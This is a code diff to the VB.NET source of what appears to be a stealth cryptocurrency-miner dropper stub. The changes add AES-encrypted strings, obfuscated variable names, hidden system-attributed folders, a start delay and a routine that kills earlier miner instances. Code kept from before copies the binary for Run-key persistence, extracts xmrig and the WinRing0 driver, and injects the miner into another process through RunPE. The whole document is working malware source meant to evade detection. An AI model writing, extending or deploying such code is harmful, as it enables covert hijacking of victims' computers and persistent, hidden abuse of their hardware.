@@ -21,11 +21,7 @@ Imports System.Text
 
 #Const Assembly = False
 #Const INS = False
-#Const EnableCPU = False
 #Const EnableGPU = False
-#Const EnableIdle = False
-#Const EnableNicehash = False
-#Const EnableSSLTLS = False
 
 #If Assembly Then
 <Assembly: AssemblyTitle("%Title%")>
@@ -39,10 +35,13 @@ Imports System.Text
 #End If
 
 Public Class Program
+    Public Shared IH As Boolean = False
+
     Public Shared Sub Main()
 #If INS Then
-                        Install()
+        Install()
 #End If
+        KillLastProc()
         Initialize()
     End Sub
 
@@ -62,6 +61,9 @@ Public Class Program
                     Dim Client As Byte() = File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName)
                     Drop.Write(Client, 0, Client.Length)
                 End Using
+                If IH Then
+                    IO.File.SetAttributes(PayloadPath, IO.FileAttributes.Hidden Or IO.FileAttributes.System)
+                End If
                 Thread.Sleep(2 * 1000)
                 Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(PayloadPath), PayloadPath)
                 Process.Start(PayloadPath)
@@ -78,33 +80,58 @@ Public Class Program
         Return AES_Decryptor(MyResource.GetObject(Get_))
     End Function
 
+    Public Shared Function GetString(ByVal input As String)
+        Return Encoding.ASCII.GetString(AES_Decryptor(Convert.FromBase64String(input)))
+    End Function
+
     Public Shared Sub Run(ByVal PL As Byte(), ByVal arg As String, ByVal buffer As Byte())
         'Credits gigajew for RunPE https://github.com/gigajew/WinXRunPE-x86_x64
         Try
-            Assembly.Load(PL).GetType("Project1.Program").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, "#InjectionDir\#InjectionTarget", arg})
+            Assembly.Load(PL).GetType("Project1.Program").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, GetString("#InjectionDir") & "\" & GetString("#InjectionTarget"), arg})
         Catch ex As Exception
         End Try
     End Sub
 
+    Public Shared Sub KillLastProc()
+        On Error Resume Next
+        Dim objWMIService = GetObject("winmgmts: " & "{impersonationLevel=impersonate}!\\" & Environment.UserDomainName & "\root\cimv2")
+        Dim colProcess = objWMIService.ExecQuery("Select * from Win32_Process")
+        Dim wmiQuery As String = String.Format("select CommandLine from Win32_Process where Name='{0}'", GetString("#InjectionTarget"))
+        Dim searcher As Management.ManagementObjectSearcher = New Management.ManagementObjectSearcher(wmiQuery)
+        Dim retObjectCollection As Management.ManagementObjectCollection = searcher.Get
+        For Each retObject As Object In colProcess
+            If retObject.CommandLine.ToString.Contains("--don") Then
+                retObject.Terminate()
+            End If
+        Next
+    End Sub
+
     Public Shared Sub Initialize()
+        If IsNumeric("#STARTDELAY") AndAlso CInt("#STARTDELAY") > 0 Then
+            Threading.Thread.Sleep(CInt("#STARTDELAY") * 1000)
+        End If
+
         Try
-            Dim xmr As Byte() = GetTheResource("#xmr")
-            Dim xmrminer As Byte() = New Byte() {}
-            Dim winring As Byte() = GetTheResource("#winring")
-            Dim baseDir As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\WinCFG\Libs\"
-            Dim runString As String = ""
+            Dim x As Byte() = GetTheResource("#xmr")
+            Dim xm As Byte() = New Byte() {}
+            Dim wr As Byte() = GetTheResource("#winring")
+            Dim lb As String = GetString("#LIBSPATH")
+            Dim bD As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb
+            Dim rS As String = ""
 
             Try
-                System.IO.Directory.CreateDirectory(baseDir)
-                My.Computer.FileSystem.WriteAllBytes(baseDir + "WinRing0x64.sys", winring, False)
+                System.IO.Directory.CreateDirectory(bD)
+                Dim DirInfo As New IO.DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb.Split(New Char() {"\"c})(0))
+                DirInfo.Attributes = FileAttributes.System Or FileAttributes.Hidden
+                My.Computer.FileSystem.WriteAllBytes(bD & "WR64.sys", wr, False)
 
-                Using archive As ZipArchive = New ZipArchive(New MemoryStream(xmr))
+                Using archive As ZipArchive = New ZipArchive(New MemoryStream(x))
                     For Each entry As ZipArchiveEntry In archive.Entries
-                        If entry.FullName.Contains("xmrig.exe") Then
+                        If entry.FullName.Contains("xm") Then
                             Using streamdata As Stream = entry.Open()
                                 Using ms = New MemoryStream()
                                     streamdata.CopyTo(ms)
-                                    xmrminer = ms.ToArray
+                                    xm = ms.ToArray
                                 End Using
                             End Using
                         End If
@@ -118,16 +145,16 @@ Public Class Program
                     Dim libs As Byte() = GetTheResource("#libs")
                     Using archive As ZipArchive = New ZipArchive(New MemoryStream(libs))
                         For Each entry As ZipArchiveEntry In archive.Entries
-                            entry.ExtractToFile(Path.Combine(baseDir, entry.FullName), True)
+                            entry.ExtractToFile(Path.Combine(bD, entry.FullName), True)
                         Next
                     End Using
 
                     If GPUstr.ToLower.Contains("nvidia") Then
-                        runString += " --cuda --cuda-loader=" + ControlChars.Quote + baseDir + "ddb64.dll" + ControlChars.Quote
+                        rS += " --cuda --cuda-loader=" + ControlChars.Quote + bD + "ddb64.dll" + ControlChars.Quote
                     End If
 
                     If GPUstr.ToLower.Contains("amd") Then
-                        runString += " --opencl "
+                        rS += " --opencl "
                     End If
 
                 Catch ex As Exception
@@ -136,34 +163,12 @@ Public Class Program
 #End If
             Catch ex As Exception
             End Try
-
-#If EnableIdle Then
-            runString += " --donate-level=5 "
-#Else
-            runString += " --donate-level=4 "
-#End If
-
-#If EnableNicehash Then
-            runString += " --nicehash "
-#End If
-
-#If EnableCPU = False Then
-            runString += " --no-cpu "
-#End If
-
-#If EnableSSLTLS Then
-            runString += " --tls "
-#End If
-
-            'If --donate-level is set to 5 idle mining is enabled if --donate-level is anything other than 5 idle mining is disabled
-            Dim argstr As String = " -B #AdvancedParams --url=#URL --user=#USER --pass=#PWD --cpu-max-threads-hint=#MaxCPU "
-            argstr = Replace(argstr, "{%RANDOM%}", Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
-            argstr = Replace(argstr, "{%COMPUTERNAME%}", RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", ""))
-            Run(GetTheResource("#dll"), argstr + runString, xmrminer)
+            Run(GetTheResource("#dll"), GetString("#ARGSTR") + rS, xm)
         Catch ex As Exception
         End Try
     End Sub
 
+#If EnableGPU Then
     Public Shared Function GetGPU() As String
         Try
             Dim VideoCard As String = ""
@@ -190,12 +195,17 @@ Public Class Program
             Return ""
         End Try
     End Function
+#End If
 
     Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
         Dim AES As New RijndaelManaged
-        Dim Hash As New MD5CryptoServiceProvider
+        Dim Hash_ As New MD5CryptoServiceProvider
         Try
-            AES.Key = Hash.ComputeHash(System.Text.Encoding.Default.GetBytes("#KEY"))
+            Dim hash(31) As Byte
+            Dim temp As Byte() = Hash_.ComputeHash(System.Text.Encoding.ASCII.GetBytes("#KEY"))
+            Array.Copy(temp, 0, hash, 0, 16)
+            Array.Copy(temp, 0, hash, 15, 16)
+            AES.Key = hash
             AES.Mode = CipherMode.ECB
             Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
             Dim Buffer As Byte() = input
